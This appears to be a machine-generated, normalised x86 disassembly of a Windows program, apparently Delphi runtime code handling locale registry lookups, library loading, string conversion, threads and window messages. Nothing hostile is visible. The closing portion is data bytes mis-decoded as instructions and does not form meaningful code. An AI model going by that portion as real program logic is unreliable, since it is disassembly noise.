mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405b90
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405b48
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405bcc
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401300
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_401308
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405bb8
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405bb8
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405bb8
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call sub_4012d0
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call sub_4012c8
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_405d84
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_4012f8
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401350
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405e89
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405bcc
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_401358
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_401350
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_401348
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_401358
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401350
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_401318
push eax
call sub_4012f0
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_405ffc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov ebx [ rw-data ]
test ebx ebx
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_405b48
mov edx edi
call esi
test al al
je r-xdata
mov ebx [ ebx ]
test ebx ebx
jne r-xdata
sub_406058
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_402764
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_402764
jmp r-xdata
sub_4060b8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4060f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_406124
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_406188
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_4060b8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40618f
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_4061ac
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_4061d8
test edx edx
je sub_406194
push eax
push ecx
push edx
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
push ecx
mov eax [ ecx ]
call [ eax + 0x8 ]
mov edx [ esp ]
retn
mov al 0x17
jmp sub_4028a0
sub_406278
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_4062a0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_40637c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
ja r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jbe r-xdata
mov ecx edx
and cl 0xf0
cmp cl 0xf0
je r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
test dl 0x40
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
ja r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
and ecx 0x3f
cmp esi [ ebp + 0x8 ]
ja r-xdata
mov ecx [ ebp - 0xc ]
mov cl [ ecx + esi ]
and cl 0xc0
cmp cl 0x80
jne r-xdata
test cl 0x20
je r-xdata
inc esi
cmp esi [ ebp + 0x8 ]
ja r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
test dl 0x20
je r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
ja r-xdata
inc esi
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
and dl 0xc0
cmp dl 0x80
jne r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_4064c0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40655f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_40442c
mov eax ebx
xor edx edx
call sub_404cf4
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406566
lea eax [ ebp - 0x4 ]
call sub_40442c
retn
mov eax ebx
call sub_404c88
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404a68
mov eax ebx
call sub_404c88
push eax
mov eax [ ebp - 0x4 ]
call sub_4046e4
inc eax
push eax
mov eax ebx
call sub_404c78
push eax
mov eax [ ebp - 0x4 ]
call sub_4048dc
pop ecx
pop edx
call sub_4062a0
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_40442c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404a68
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404480
sub_40656c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_406603
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404b1c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40660a
lea eax [ ebp - 0x4 ]
call sub_404b1c
retn
mov eax ebx
call sub_4046e4
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404dc4
mov eax ebx
call sub_4046e4
push eax
mov eax [ ebp - 0x4 ]
call sub_404c88
inc eax
push eax
mov eax ebx
call sub_4048dc
push eax
mov eax [ ebp - 0x4 ]
call sub_404c78
pop ecx
pop edx
call sub_40637c
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404b1c
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404dc4
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404b58
sub_406610
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_406653
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404c68
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4064c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40665a
lea eax [ ebp - 0x4 ]
call sub_404b1c
retn
sub_406660
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_40461c
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405b90
push eax
call sub_401328
mov ecx eax
mov edx esp
mov eax esi
call sub_40451c
jmp r-xdata
sub_4066b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_406702
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_406709
retn
mov eax rw-data
call sub_402e20
mov eax rw-data
call sub_402e20
mov eax rw-data
call sub_402e20
call sub_401b54
sub_40670c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov [ rw-data ] 0x2
mov [ rw-data ] 0x2
mov [ rw-data ] sub_4053b4
call sub_4034f8
test al al
je r-xdata
call sub_4035ec
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
mov [ rw-data ] 0xd7b0
call sub_4052ac
call GetCommandLineA
mov [ rw-data ] eax
call sub_4013a0
mov [ rw-data ] eax
call sub_401398
mov [ rw-data ] eax
call sub_403528
sub_4067b4
push ebx
call sub_4067ac
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov eax ebx
call sub_4067a0
test eax eax
jne r-xdata
mov eax 0xe2
call sub_404420
push eax
mov eax [ rw-data ]
push eax
call TlsSetValue
mov eax 0xe2
call sub_404420
sub_4067f8
mov cl [ rw-data ]
mov eax [ rw-data ]
test cl cl
jne r-xdata
push eax
call TlsGetValue
test eax eax
je r-xdata
mov edx [ fs : 0x2c ]
mov eax [ edx + eax * 4 ]
retn
call sub_4067b4
mov eax [ rw-data ]
push eax
call TlsGetValue
test eax eax
je r-xdata
retn
mov eax [ rw-data ]
retn
retn
sub_406844
push ebx
mov ebx eax
xor eax eax
mov [ rw-data ] eax
push 0x0
call sub_406780
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
call sub_406838
mov edx rw-data
mov eax ebx
call sub_404198
pop ebx
retn
sub_406888
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4068ad
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4068b4
retn
sub_4068e4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
push esi
mov edi esi
mov esi edx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax [ ebx ]
cmp eax [ edx ]
jle r-xdata
mov eax [ ebx + 0x4 ]
cmp eax [ edx + 0x4 ]
jle r-xdata
mov [ esi ] eax
mov eax [ ebx + 0x8 ]
cmp eax [ edx + 0x8 ]
jge r-xdata
mov [ esi + 0x4 ] eax
mov eax [ ebx + 0xc ]
cmp eax [ edx + 0xc ]
jge r-xdata
mov [ esi + 0x8 ] eax
mov eax esi
call sub_406944
mov ebx eax
xor bl 0x1
test bl bl
jne r-xdata
mov [ esi + 0xc ] eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax esi
xor ecx ecx
mov edx 0x10
call sub_402fc4
sub_406974
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
add ecx eax
mov [ ebx + 0x8 ] ecx
add edx [ ebp + 0xc ]
mov [ ebx + 0xc ] edx
pop ebx
pop ebp
retn 0x8
sub_406990
push ebx
mov ebx [ eax + 0x8 ]
mov ecx [ eax ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
add ebx ecx
mov [ edx ] ebx
mov ebx [ eax + 0xc ]
mov ecx [ eax + 0x4 ]
sub ebx ecx
sar ebx 0x1
jns r-xdata
adc ebx 0x0
add ebx ecx
mov [ edx + 0x4 ] ebx
pop ebx
retn
adc ebx 0x0
sub_4069bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4069e1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4069e8
retn
sub_4074c8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x18 ]
push ebx
mov ebx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x20 ]
push ebx
mov ebx [ ebp + 0x24 ]
push ebx
push ecx
push edx
push eax
push 0x0
call CreateWindowExA
pop ebx
pop ebp
retn 0x20
sub_4074fc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
push r-xdata
push r-xdata
call FindWindowA
mov ebx eax
push r-xdata
call RegisterWindowMessageA
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
push r-xdata
call RegisterWindowMessageA
mov [ esi ] eax
push r-xdata
call RegisterWindowMessageA
mov [ edi ] eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
xor edx edx
mov [ eax ] edx
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x3
test ebx ebx
je r-xdata
push 0x0
push 0x0
mov eax [ esi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0xc ]
mov [ edx ] eax
jmp r-xdata
push 0x0
push 0x0
mov eax [ edi ]
push eax
push ebx
call SendMessageA
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_4075f1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_407619
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407620
retn
sub_40762c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_407651
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407658
retn
sub_407664
adc al 0xe7
dec eax
add al dh
inc [ eax ]
add [ edi ] dl
dec eax
add cl dh
inc [ eax ]
add [ edi ] dl
dec eax
add dl dh
inc [ eax ]
add [ edi ] dl
dec eax
add bl dh
inc [ eax ]
add [ edi ] dl
dec eax
add ah dh
inc [ eax ]
add [ edi ] dl
dec eax
add ch dh
inc [ eax ]
add [ edi ] dl
dec eax
add dh dh
inc [ eax ]
add [ edi ] dl
dec eax
add bh dh
inc [ eax ]
add [ edi ] dl
dec eax
add al bh
inc [ eax ]
add [ edi ] dl
dec eax
add cl bh
inc [ eax ]
add [ edi ] dl
dec eax
add dl bh
inc [ eax ]
add [ edi ] dl
dec eax
add bl bh
inc [ eax ]
add [ edi ] dl
dec eax
add ah bh
inc [ eax ]
add [ edi ] dl
dec eax
add ch bh
inc [ eax ]
add [ edi ] dl
dec eax
add dh bh
inc [ eax ]
add [ edi ] dl
dec eax
add bh bh
inc [ eax ]
add [ edi ] dl
dec eax
add al ah
inc [ eax ]
add [ edi ] dl
dec eax
add cl ah
inc [ eax ]
add [ edi ] dl
dec eax
add dl ah
inc [ eax ]
add [ edi ] dl
dec eax
add bl ah
inc [ eax ]
add [ edi ] dl
dec eax
add ah ah
inc [ eax ]
add [ edi ] dl
dec eax
add ch ah
inc [ eax ]
add [ edi ] dl
dec eax
add dh ah
inc [ eax ]
add [ edi ] dl
dec eax
add bh ah
inc [ eax ]
add [ edi ] dl
dec eax
add al ch
inc [ eax ]
add [ edi ] dl
dec eax
add cl ch
inc [ eax ]
add [ edi ] dl
dec eax
add dl ch
inc [ eax ]
add [ edi ] dl
dec eax
add bl ch
inc [ eax ]
add [ edi ] dl
dec eax
add ah ch
inc [ eax ]
add [ edi ] dl
dec eax
add ch ch
inc [ eax ]
add [ edi ] dl
dec eax
add dh ch
inc [ eax ]
add [ edi ] dl
dec eax
add bh ch
inc [ eax ]
add [ edi ] dl
dec eax
add al dl
inc [ eax ]
add [ edi ] dl
dec eax
add cl dl
inc [ eax ]
add [ edi ] dl
dec eax
add dl dl
inc [ eax ]
add [ edi ] dl
dec eax
add bl dl
inc [ eax ]
add [ edi ] dl
dec eax
add ah dl
inc [ eax ]
add [ edi ] dl
dec eax
add ch dl
inc [ eax ]
add [ edi ] dl
dec eax
add dh dl
inc [ eax ]
add [ edi ] dl
dec eax
add bh dl
inc [ eax ]
add [ edi ] dl
dec eax
add al bl
inc [ eax ]
add [ edi ] dl
dec eax
add cl bl
inc [ eax ]
add [ edi ] dl
dec eax
add dl bl
inc [ eax ]
add [ edi ] dl
dec eax
add bl bl
inc [ eax ]
add [ edi ] dl
dec eax
add ah bl
inc [ eax ]
add [ edi ] dl
dec eax
add ch bl
inc [ eax ]
add [ edi ] dl
dec eax
add dh bl
inc [ eax ]
add [ edi ] dl
dec eax
add bh bl
inc [ eax ]
add [ edi ] dl
dec eax
add al al
inc [ eax ]
add [ edi ] dl
dec eax
add cl al
inc [ eax ]
add [ edi ] dl
dec eax
add dl al
inc [ eax ]
add [ edi ] dl
dec eax
add bl al
inc [ eax ]
add [ edi ] dl
dec eax
add ah al
inc [ eax ]
add [ edi ] dl
dec eax
add ch al
inc [ eax ]
add [ edi ] dl
dec eax
add dh al
inc [ eax ]
add [ edi ] dl
dec eax
add bh al
inc [ eax ]
add [ edi ] dl
dec eax
add al cl
inc [ eax ]
add [ edi ] dl
dec eax
add cl cl
inc [ eax ]
add [ edi ] dl
dec eax
add dl cl
inc [ eax ]
add [ edi ] dl
dec eax
add bl cl
inc [ eax ]
add [ edi ] dl
dec eax
add ah cl
inc [ eax ]
add [ edi ] dl
dec eax
add ch cl
inc [ eax ]
add [ edi ] dl
dec eax
add dh cl
inc [ eax ]
add [ edi ] dl
dec eax
add bh cl
inc [ eax ]
add [ edi ] dl
dec eax
add [ eax + 0x140000ff ] dh
out 0x48 eax
add [ ecx + 0x140000ff ] dh
out 0x48 eax
add [ edx + 0x140000ff ] dh
out 0x48 eax
add [ ebx + 0x140000ff ] dh
out 0x48 eax
add [ edi + edi * 8 - 0x18ec0000 ] dh
dec eax
add [ ebp + 0x140000ff ] dh
out 0x48 eax
add [ esi + 0x140000ff ] dh
out 0x48 eax
add [ edi + 0x140000ff ] dh
out 0x48 eax
add [ eax + 0x140000ff ] bh
out 0x48 eax
add [ ecx + 0x140000ff ] bh
out 0x48 eax
add [ edx + 0x140000ff ] bh
out 0x48 eax
add [ ebx + 0x140000ff ] bh
out 0x48 eax
add [ edi + edi * 8 - 0x18ec0000 ] bh
dec eax
add [ ebp + 0x140000ff ] bh
out 0x48 eax
add [ esi + 0x140000ff ] bh
out 0x48 eax
add [ edi + 0x140000ff ] bh
out 0x48 eax
add [ eax + 0x140000ff ] ah
out 0x48 eax
add [ ecx + 0x140000ff ] ah
out 0x48 eax
add [ edx + 0x140000ff ] ah
out 0x48 eax
add [ ebx + 0x140000ff ] ah
out 0x48 eax
add [ edi + edi * 8 - 0x74ab0000 ] ah
in al dx
xor eax eax
push ebp
push sub_407931
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_407938
retn
sub_407944
dec eax
jns r-xdata
add [ eax ] bl
cmp [ eax ] eax
sbb al 0x39
inc eax
add [ eax ] dl
cmp [ eax ] eax
pop eax
inc eax
add [ esi + esi + 0x40 ] dh
add [ eax + 0xe004036 ] dh
add [ edx ] cl
or [ esi + eax * 2 + 0x69 ] edx
insb
dec esi
popad
insd
nop
mov al [ 0x4079 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4079 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + 0xc004079 ] dh
add [ eax ] al
add al bl
adc [ eax ] al
or [ ecx ] bh
inc eax
add [ ecx + edi ] dl
inc eax
add [ eax ] al
add [ eax ] al
outsd
outsb
or [ edx + 0x40 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
